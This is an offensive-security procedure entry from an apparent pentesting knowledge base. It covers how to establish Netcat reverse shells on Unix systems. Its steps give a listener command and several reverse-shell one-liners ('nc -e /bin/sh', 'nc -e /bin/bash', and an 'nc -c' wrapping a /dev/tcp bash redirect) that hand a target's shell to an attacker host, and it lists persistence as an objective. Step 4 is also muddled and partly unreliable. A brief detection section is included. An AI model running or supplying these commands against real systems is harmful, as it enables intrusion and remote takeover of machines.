---
type: procedure
description: >-
  A step-by-step guide to setting up and establishing a reverse shell connection
  using Netcat on Unix-like systems.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059.004 - Command and
    Scripting Interpreter: Unix Shell]]
sub_techniques: []
tags:
  - '[[tags/Netcat-Traditional]]'
  - '[[tags/Reverse-Shell]]'
commands:
  - '[[commands/nc-listen-for-reverse-shell]]'
  - '[[commands/nc-reverse-shell-sh]]'
  - '[[commands/nc-reverse-shell-bash-e]]'
  - '[[commands/nc-reverse-shell-bash-c]]'
platforms:
  - Linux
  - Unix
tools:
  - '[[tools/Netcat]]'
validated: true
---

# Establish-Reverse-Shell-with-Netcat

## Summary

This procedure outlines how to establish a reverse shell using Netcat (nc), a versatile networking tool, to create a connection from a target system back to an attacker-controlled machine. This allows remote command execution on the target as if locally present. It is commonly used in penetration testing for post-exploitation access after initial compromise.

## Description

Netcat facilitates reverse shells by setting up a listener on the attacker's machine and executing a connecting command on the target. The target initiates the outbound connection, which is useful for bypassing firewalls that block inbound traffic. This technique assumes the attacker has command execution capability on the target (e.g., via RCE or initial access). Variations use different shells (/bin/sh for basic, /bin/bash for interactive) and Netcat options (-e for exec, -c for compatible exec). Success results in an interactive shell on the attacker's terminal. This maps to MITRE ATT&CK for Unix shell execution in offensive operations.

## Requirements

1. Netcat installed on both attacker and target machines (traditional Netcat with -e support; OpenBSD variant may lack -e).
2. Network connectivity allowing outbound TCP from target to attacker (common ports like 4444).
3. Command execution access on the target (e.g., via compromised web shell or user account).
4. Attacker machine with a public or reachable IP/port.

## Defense

Defensive measures and detection strategies:

- Monitor outbound network connections to unusual IPs/ports using firewalls or IDS (e.g., Suricata rules for nc traffic).
- Disable or restrict Netcat execution via application whitelisting (e.g., AppArmor, SELinux).
- Enable command logging (e.g., auditd on Linux) to detect nc invocations.
- Use endpoint detection tools to flag process spawning from nc (e.g., unusual parent-child processes like nc spawning sh).

## Objectives

1. Establish a persistent reverse shell for remote command execution.
2. Provide interactive access to the target's filesystem and processes.
3. Maintain access for further post-exploitation activities.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Start a Netcat listener to wait for the incoming connection from the target. This binds to a specified port and enables verbose output for connection details.

**Command** ([[commands/nc-listen-for-reverse-shell]]):
```bash
nc -lvp $_ATTACKER_PORT
```

> This command listens on the specified port. Replace $_ATTACKER_PORT with your chosen port (e.g., 4444). Expected output includes a message like "Listening on [0.0.0.0] ($_ATTACKER_PORT)" when ready.

### Step 2: Execute Basic Reverse Shell with /bin/sh on Target

**Context**: On the target, run Netcat to connect back to the attacker and execute a basic shell. This provides minimal interactivity but is widely compatible.

**Command** ([[commands/nc-reverse-shell-sh]]):
```bash
nc -e /bin/sh $_ATTACKER_IP $_ATTACKER_PORT
```

> The -e option executes /bin/sh after connection. Replace $_ATTACKER_IP and $_ATTACKER_PORT with attacker details. Expected output on attacker: Connection accepted, followed by a shell prompt (e.g., $).

### Step 3: Execute Enhanced Reverse Shell with /bin/bash on Target

**Context**: Use /bin/bash for a more feature-rich shell with better tab completion and history, if available on the target.

**Command** ([[commands/nc-reverse-shell-bash-e]]):
```bash
nc -e /bin/bash $_ATTACKER_IP $_ATTACKER_PORT
```

> Similar to Step 2 but spawns bash. Expected: Interactive bash shell on attacker side (e.g., bash-4.4$ prompt).

### Step 4: Execute Reverse Shell with Compatible Bash Option on Target

**Context**: For Netcat versions without -e (e.g., OpenBSD nc), use -c to execute bash. This is a fallback for compatibility.

**Command** ([[commands/nc-reverse-shell-bash-c]]):
```bash
nc -c "bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT 0>&1" $_ATTACKER_IP $_ATTACKER_PORT
```

> The -c option runs the quoted command. Note: Syntax may vary; test in lab. Expected: Bidirectional shell connection on attacker.

## Expected Output

Successful execution results in a shell prompt on the attacker's listener terminal, allowing commands like whoami, ls, or id to run on the target with output returned. No errors like "connection refused" or "nc: command not found" should appear. Verify by running a simple command (e.g., pwd) and seeing the target's current directory.
